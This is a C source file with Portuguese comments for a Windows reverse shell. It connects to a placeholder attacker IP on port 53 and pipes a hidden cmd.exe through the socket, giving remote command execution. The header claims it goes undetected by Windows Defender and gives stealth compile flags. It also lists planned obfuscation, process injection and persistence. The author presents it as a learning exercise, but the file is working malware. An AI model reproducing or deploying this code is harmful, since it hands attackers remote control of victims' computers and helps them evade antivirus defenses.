/*
Shell reversa simples criada em C.
O Objetivo dessa deste código é aprimorar os conhecimentos em C, especificamente em Windows API e Socket.

Até o momento (08/24) não detectada pelo Windows Defender.

Compilação:
No Linux para Windows
x86_64-w64-mingw32-gcc shell.c -o shell.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -lWs2_32 -mwindows

No Windows:
gcc shell.c -o shell.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -lWs2_32 -mwindows

Próximos passos:
[ ] implementar conexão criptografada utilizando openssl;
[ ] Função de upload/download de arquivo;
[ ] Ofuscar o código;
[ ] Migração de processo via Process injection;
[ ] Persistência.

Gabriel Weitzel
*/

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

//Ip do servidor - SUBSTITUIR!!!
#define IP "192.168.0.1"

//Porta SUBSTITUIR!!!
#define PORTA 53

//Definindo estruturas.
SOCKADDR_IN AddrSock;
WSADATA DadosWsa;
SOCKET  winSock;

//Configurações de inicialização do processo.
STARTUPINFO info;
PROCESS_INFORMATION proc_info;

//Declarando protótipo da função (ajuda na compilação).
void shell_connect(void);

int main() {

    shell_connect();

    return 0;
}

void shell_connect(void){

    //Montando estrutura da Sock.
    WSAStartup(MAKEWORD(2,2), &DadosWsa);

    winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,0, 0);
    AddrSock.sin_family = AF_INET;
    AddrSock.sin_port = htons(PORTA);
    AddrSock.sin_addr.s_addr = inet_addr(IP);
    //Em caso de erro na criação da sock, limpa a memória e sai.
    if (winSock == INVALID_SOCKET) {
        WSACleanup();
        exit(1);
    }

    //Conectando a Sock e troca de comandos.
    int status = WSAConnect(winSock, (SOCKADDR*)&AddrSock, sizeof(AddrSock), NULL, NULL, NULL, NULL);
    memset(&info, 0, sizeof(info));
    info.cb = sizeof(info);
    info.dwFlags = STARTF_USESTDHANDLES;
    info.wShowWindow = SW_HIDE;         //Oculta a janela (stealth mode).
    info.hStdError = (HANDLE)winSock;
    info.hStdInput = (HANDLE)winSock;
    info.hStdOutput = (HANDLE)winSock;

    //Em caso de erro na conexão, limpa a memória e sai.
    if(status != 0){
        closesocket(winSock);
        WSACleanup();
        exit(1);
    }
    //Se algum erro na criação do processo, limpa a memória e sai.
    if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL,TRUE , 0, NULL, NULL, &info, &proc_info)){
        closesocket(winSock);
        WSACleanup();
        exit(1);
    }

    //Aguarda o término do processo.
    WaitForSingleObject(proc_info.hProcess, INFINITE);

    //Limpeza dos recursos.
    closesocket(winSock);
    WSACleanup();

}
